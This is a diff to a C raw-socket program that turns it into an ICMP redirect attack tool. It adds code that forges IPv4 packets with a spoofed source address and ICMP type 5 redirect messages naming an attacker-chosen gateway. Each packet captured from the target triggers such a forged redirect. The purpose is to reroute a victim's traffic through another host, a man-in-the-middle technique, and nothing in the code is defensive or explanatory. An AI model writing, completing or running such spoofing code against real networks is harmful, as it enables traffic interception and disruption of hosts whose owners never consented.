@@ -54,8 +54,7 @@ struct my_icmphdr
 	uint8_t type;
 	uint8_t code;
 	uint16_t check_sum;
-	uint16_t id;
-	uint16_t seq;
+	uint32_t gateway;
 };
 char dev[100];
 char gateway_str[100];
@@ -64,6 +63,30 @@ char target_str[100];
 u32_t gateway=0;
 u32_t src=0;
 u32_t target=0;
+int raw_send_fd=-1;
+int raw_recv_fd=-1;
+unsigned short csum(const unsigned short *ptr,int nbytes) {//works both for big and little endian
+	long sum;
+	unsigned short oddbyte;
+	short answer;
+
+	sum=0;
+	while(nbytes>1) {
+		sum+=*ptr++;
+		nbytes-=2;
+	}
+	if(nbytes==1) {
+		oddbyte=0;
+		*((u_char*)&oddbyte)=*(u_char*)ptr;
+		sum+=oddbyte;
+	}
+
+	sum = (sum>>16)+(sum & 0xffff);
+	sum = sum + (sum>>16);
+	answer=(short)~sum;
+
+	return(answer);
+}
 int print_help()
 {
 	printf("useage:\n");
@@ -117,6 +140,49 @@ int print_packet(char *buf,int len)
 		printf("%02x ",(int)(unsigned char)buf[i]);
 	printf("}\n");
 }
+u32_t g_ip_id_counter=12345;
+int raw_send(char *data,int len)
+{
+	struct sockaddr_in sin={0};
+	sin.sin_family = AF_INET;
+	sin.sin_addr.s_addr = target;
+	int ret = sendto(raw_send_fd, data, len ,  0, (struct sockaddr *) &sin, sizeof (sin));
+}
+int send_ip_packet(char *payload,int payloadlen)
+{
+	char buf[buf_len];
+	my_iphdr *  iph;
+	iph=(struct my_iphdr *) buf;
+	memset(iph,0,sizeof(my_iphdr));
+	iph->ihl = sizeof(my_iphdr)/4;
+	iph->version = 4;
+	iph->tos = 0;
+	iph->id = htons (g_ip_id_counter++);	
+	iph->frag_off = htons(0x4000); //DF set,others are zero
+	iph->ttl = (unsigned char)128;
+	iph->protocol = IPPROTO_ICMP;
+	iph->check = 0; //let kernel fill this
+	iph->saddr = src;    //Spoof the source ip address
+	iph->daddr = target;
+	iph->tot_len = 0;//let kernel fill this
+	memcpy(buf+sizeof(my_iphdr) , payload, payloadlen);
+	raw_send(buf,sizeof(my_iphdr) +payloadlen);
+	return 0;
+}
+int send_icmp_packet(char * payload,int payloadlen)
+{
+	char buf[buf_len];
+	my_icmphdr *icmph;
+	icmph=(struct my_icmphdr *) buf;
+	icmph->type=5;
+	icmph->code=1;
+	icmph->check_sum=0;
+	icmph->gateway=gateway;
+	memcpy(buf+sizeof(my_icmphdr) , payload, payloadlen);	
+	icmph->check_sum = csum( (unsigned short*) buf, sizeof(my_icmphdr)+payloadlen);
+	send_ip_packet(buf,payloadlen+sizeof(my_icmphdr));
+	return 0;
+}
 int on_recv_a_packet(char *buf,int len)
 {
 	print_packet(buf,len);
@@ -134,15 +200,20 @@ int on_recv_a_packet(char *buf,int len)
 	}
 	u32_t saddr=iph->saddr;
 	u32_t daddr=iph->daddr;
-	printf("%x %x\n",saddr,target);
-	
+	if(saddr!=target) return 0;
+	//printf("%x %x\n",saddr,target);
+	print_packet(buf,len);	
+	int icmp_data_len=28;
+	if(len<icmp_data_len)
+		icmp_data_len=len;
+	send_icmp_packet(buf,icmp_data_len);
 }
 int main(int argc,char *argv[])
 {
 	process_opt(argc,argv);
-	int raw_recv_fd=socket(PF_PACKET , SOCK_DGRAM , htons(ETH_P_IP));
+	raw_recv_fd=socket(PF_PACKET , SOCK_DGRAM , htons(ETH_P_IP));
 	assert(raw_recv_fd>=0);
-	int raw_send_fd=socket(AF_INET,SOCK_RAW,IPPROTO_RAW);
+	raw_send_fd=socket(AF_INET,SOCK_RAW,IPPROTO_RAW);
 	assert(raw_send_fd>=0);
 	int one = 1;
 	const int *val = &one;
